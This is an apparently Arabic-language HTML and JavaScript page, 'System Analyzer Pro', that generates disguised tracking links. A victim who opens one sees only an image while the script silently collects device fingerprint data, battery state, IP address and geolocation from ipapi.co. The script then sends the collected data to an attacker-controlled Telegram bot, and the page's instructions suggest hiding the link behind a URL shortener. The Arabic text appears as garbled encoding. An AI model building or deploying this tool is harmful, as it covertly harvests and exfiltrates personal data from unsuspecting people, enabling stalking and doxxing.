<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Analyzer Pro</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --accent: #00ff88; --bg: #0a0a0b; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .panel { width: 90%; max-width: 500px; background: #16161a; padding: 25px; border-radius: 15px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: var(--accent); text-align: center; margin-bottom: 25px; font-size: 1.2rem; text-transform: uppercase; }
        label { display: block; margin: 15px 0 5px; font-size: 0.85rem; color: #888; }
        input { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--accent); border-radius: 8px; box-sizing: border-box; }
        .btn { background: var(--accent); color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; }
        .btn:hover { filter: brightness(1.2); transform: translateY(-2px); }
        #resultArea { display: none; margin-top: 20px; padding: 15px; background: #000; border: 1px dashed var(--accent); border-radius: 8px; }
        textarea { width: 100%; height: 60px; background: transparent; color: #fff; border: none; resize: none; font-size: 0.8rem; outline: none; }
        img { max-width: 100%; border-radius: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="panel" id="adminPanel">
    <h2>[ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… ÙˆØ§Ù„Ø¥Ù†Ø´Ø§Ø¡ ]</h2>
    
    <label>ØªÙˆÙƒÙ† Ø¨ÙˆØª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…:</label>
    <input type="text" id="botToken" placeholder="7123456789:AAEj...">
    
    <label>Ø£ÙŠØ¯ÙŠ Ø­Ø³Ø§Ø¨Ùƒ (Chat ID):</label>
    <input type="text" id="chatId" placeholder="123456789">

    <label>Ø±Ø§Ø¨Ø· Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¨Ø§Ø´Ø±Ø© (Ù„ØªØ¬Ù†Ø¨ Ø·ÙˆÙ„ Ø§Ù„Ø±Ø§Ø¨Ø·):</label>
    <input type="text" id="imgUrl" placeholder="https://example.com/image.jpg">
    <p style="font-size: 10px; color: #666;">* Ø§Ø±ÙØ¹ ØµÙˆØ±ØªÙƒ Ø¹Ù„Ù‰ Ø£ÙŠ Ù…ÙˆÙ‚Ø¹ Ù„Ø±ÙØ¹ Ø§Ù„ØµÙˆØ± ÙˆØ¶Ø¹ Ø§Ù„Ø±Ø§Ø¨Ø· Ù‡Ù†Ø§ Ù„ÙŠÙƒÙˆÙ† Ø§Ù„Ø±Ø§Ø¨Ø· Ù‚ØµÙŠØ±Ø§Ù‹.</p>

    <button class="btn" onclick="buildLink()">ØªÙˆÙ„ÙŠØ¯ Ø±Ø§Ø¨Ø· Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…Ø·ÙˆØ±</button>

    <div id="resultArea">
        <label>Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ:</label>
        <textarea id="finalLink" readonly></textarea>
        <p style="color: var(--accent); font-size: 11px; text-align: center;">Ø§Ù„Ø¢Ù† Ù‚Ù… Ø¨Ø§Ø®ØªØµØ§Ø± Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¹Ø¨Ø± bitly Ø£Ùˆ Ø£ÙŠ Ø®Ø¯Ù…Ø© Ø£Ø®Ø±Ù‰.</p>
    </div>
</div>

<div id="victimView" class="hidden">
    <img id="targetImage" src="">
</div>

<script>
    const params = new URLSearchParams(window.location.search);

    // --- Ø§ÙƒØªØ´Ø§Ù Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¨Ø¯Ù‚Ø© (Fingerprinting) ---
    function getExtraInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        return {
            gpu: gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
            cores: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
            resolution: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`
        };
    }

    // --- Ù…Ù†Ø·Ù‚ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù (Ø§Ù„Ø¶Ø­ÙŠØ©) ---
    if (params.has('t') && params.has('c')) {
        document.getElementById('adminPanel').classList.add('hidden');
        document.getElementById('victimView').classList.remove('hidden');

        const token = atob(params.get('t'));
        const chat = atob(params.get('c'));
        const img = atob(params.get('i'));

        document.getElementById('targetImage').src = img;

        executeTracking(token, chat);
    }

    // --- Ù…Ù†Ø·Ù‚ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· (Ø£Ù†Øª) ---
    function buildLink() {
        const t = btoa(document.getElementById('botToken').value);
        const c = btoa(document.getElementById('chatId').value);
        const i = btoa(document.getElementById('imgUrl').value);

        if(!t || !c || !i) return alert("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ ÙƒØ§ÙØ© Ø§Ù„Ø­Ù‚ÙˆÙ„!");

        const base = window.location.href.split('?')[0];
        const generated = `${base}?t=${t}&c=${c}&i=${i}`;
        
        document.getElementById('finalLink').value = generated;
        document.getElementById('resultArea').style.display = 'block';
    }

    // --- Ù†Ø¸Ø§Ù… Ø§Ù„Ø¬Ù…Ø¹ ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ ---
    async function executeTracking(token, chat) {
        const parser = new UAParser();
        const ua = parser.getResult();
        const extra = getExtraInfo();
        
        let battery = "N/A";
        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`; } catch(e){}

        let net = {};
        try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e){}

        const report = `
ğŸ“Š **ØªÙ‚Ø±ÙŠØ± Ø§Ø³ØªØ®Ø¨Ø§Ø±Ø§ØªÙŠ Ø¬Ø¯ÙŠØ¯**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${ua.device.vendor || 'PC'} ${ua.device.model || ''}
ğŸ–¥ï¸ **Ø§Ù„Ù†Ø¸Ø§Ù…:** ${ua.os.name} ${ua.os.version}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${ua.browser.name}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${battery}

âš™ï¸ **Ø§Ù„Ù…ÙˆØ§ØµÙØ§Øª Ø§Ù„ØªÙ‚Ù†ÙŠØ©:**
â€¢ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬: ${extra.cores} Cores
â€¢ Ø§Ù„Ø±Ø§Ù… Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠ: ${extra.ram}
â€¢ ÙƒØ±Øª Ø§Ù„Ø´Ø§Ø´Ø©: ${extra.gpu}
â€¢ Ø§Ù„Ø´Ø§Ø´Ø©: ${extra.resolution}

ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø´Ø¨ÙƒØ©:**
â€¢ IP: ${net.ip}
â€¢ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${net.city}, ${net.country_name}
â€¢ Ø§Ù„Ø´Ø±ÙƒØ© Ø§Ù„Ù…Ø²ÙˆØ¯Ø©: ${net.org}
â€¢ ØªÙˆÙ‚ÙŠØª Ø§Ù„ÙØªØ­: ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text: report, parse_mode: 'Markdown' })
        });
    }
</script>
</body>
</html>
